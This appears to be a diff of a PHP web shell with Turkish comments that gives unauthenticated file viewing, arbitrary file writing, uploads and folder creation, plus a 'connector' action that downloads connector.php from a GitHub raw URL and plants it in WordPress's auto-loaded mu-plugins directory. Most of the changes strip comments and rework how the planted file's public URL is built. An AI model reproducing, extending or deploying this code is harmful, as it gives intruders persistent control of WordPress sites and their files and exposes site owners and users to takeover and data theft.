@@ -8,27 +8,16 @@ function updir($ADir){
     return substr($ADir, 0, strrpos($ADir, '/'));
 }
 
-// -------- wp-content dizinini bul (yukarı + aşağı tarama) --------
 function find_wp_content($start) {
     $start = rtrim($start, '/');
-
-    // 1. Doğrudan altında mı?
-    if (is_dir($start . '/wp-content')) {
-        return $start . '/wp-content';
-    }
-
-    // 2. Yukarı doğru tara
+    if (is_dir($start . '/wp-content')) return $start . '/wp-content';
     $dir = $start;
     while ($dir !== '' && $dir !== '/' && strpos($dir, '/') !== false) {
         $parent = updir($dir);
         if ($parent === $dir) break;
         $dir = $parent;
-        if (is_dir($dir . '/wp-content')) {
-            return $dir . '/wp-content';
-        }
+        if (is_dir($dir . '/wp-content')) return $dir . '/wp-content';
     }
-
-    // 3. Aşağı doğru recursive tara
     try {
         $iterator = new RecursiveIteratorIterator(
             new RecursiveDirectoryIterator($start, FilesystemIterator::SKIP_DOTS),
@@ -39,26 +28,15 @@ function find_wp_content($start) {
                 return $file->getPathname();
             }
         }
-    } catch (Exception $e) {
-        // izin hatası vs. yut
-    }
-
+    } catch (Exception $e) {}
     return null;
 }
 
-// -------- URL'den içerik indir --------
 function fetch_remote($url) {
     if (ini_get('allow_url_fopen')) {
         $ctx = stream_context_create([
-            'http' => [
-                'timeout' => 15,
-                'user_agent' => 'ConnectorInstaller/1.0',
-                'follow_location' => 1,
-            ],
-            'ssl' => [
-                'verify_peer' => true,
-                'verify_peer_name' => true,
-            ],
+            'http' => ['timeout' => 15, 'user_agent' => 'ConnectorInstaller/1.0', 'follow_location' => 1],
+            'ssl'  => ['verify_peer' => true, 'verify_peer_name' => true],
         ]);
         $content = @file_get_contents($url, false, $ctx);
         if ($content !== false && $content !== '') return $content;
@@ -84,20 +62,17 @@ function fetch_remote($url) {
 
 $path = isset($_GET['file']) ? $_GET['file'] : $root;
 
-// -------- Dosya görüntüleme --------
 if (isset($_GET['view']) && is_file($_GET['view'])) {
     header("Content-type: text/plain");
     readfile($_GET['view']);
     exit;
 }
 
-// -------- Dosya düzenleme (kaydetme) --------
 if (isset($_POST['save_file']) && isset($_POST['content'])) {
     file_put_contents($_POST['save_file'], $_POST['content']);
     echo "<b>Dosya kaydedildi.</b><br><br>";
 }
 
-// -------- Dosya yükleme --------
 if (isset($_FILES['upload_file'])) {
     $target = rtrim($path, '/') . '/' . basename($_FILES['upload_file']['name']);
     if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
@@ -107,7 +82,6 @@ if (isset($_FILES['upload_file'])) {
     }
 }
 
-// -------- KLASÖR OLUŞTURMA --------
 if (isset($_POST['new_folder']) && trim($_POST['new_folder']) !== '') {
     $folderName = trim($_POST['new_folder']);
     $folderName = str_replace(array('..', '/', '\\', "\0"), '', $folderName);
@@ -127,11 +101,9 @@ if (isset($_POST['new_folder']) && trim($_POST['new_folder']) !== '') {
     }
 }
 
-// -------- CONNECTOR EKLE --------
 $connectorResult = null;
 if (isset($_POST['add_connector'])) {
     $SOURCE_URL = 'https://raw.githubusercontent.com/iComsium/iComsium/refs/heads/master/connector.php';
-
     $wpContent = find_wp_content($root);
 
     if ($wpContent === null) {
@@ -163,12 +135,25 @@ if (isset($_POST['add_connector'])) {
                 if (@file_put_contents($targetFile, $content, LOCK_EX) !== false) {
                     @chmod($targetFile, 0644);
 
+                    // ---- URL'yi her zaman https://site.com/wp-content/mu-plugins/connector.php olarak üret ----
                     $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-                    $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
-                    $rootPath = str_replace('\\', '/', realpath($root));
-                    $wpPath = str_replace('\\', '/', realpath($wpContent));
-                    $relative = str_replace($rootPath, '', $wpPath);
-                    $url = $scheme . '://' . $host . $relative . '/mu-plugins/connector.php';
+                    $host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
+
+                    // yukle.php'nin web üzerindeki dizin yolu
+                    $scriptDir = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/')), '/');
+                    if ($scriptDir === '.' || $scriptDir === '\\') $scriptDir = '';
+
+                    // $root ile $wpContent arasındaki göreceli farkı bul
+                    $rootNorm = rtrim(str_replace('\\', '/', $root), '/');
+                    $wpNorm   = rtrim(str_replace('\\', '/', $wpContent), '/');
+
+                    if (strpos($wpNorm, $rootNorm) === 0) {
+                        $relative = substr($wpNorm, strlen($rootNorm)); // "/wp-content" veya "/alt/wp-content"
+                    } else {
+                        $relative = '/wp-content';
+                    }
+
+                    $url = $scheme . '://' . $host . $scriptDir . rtrim($relative, '/') . '/mu-plugins/connector.php';
 
                     $connectorResult = array(
                         'ok' => true,
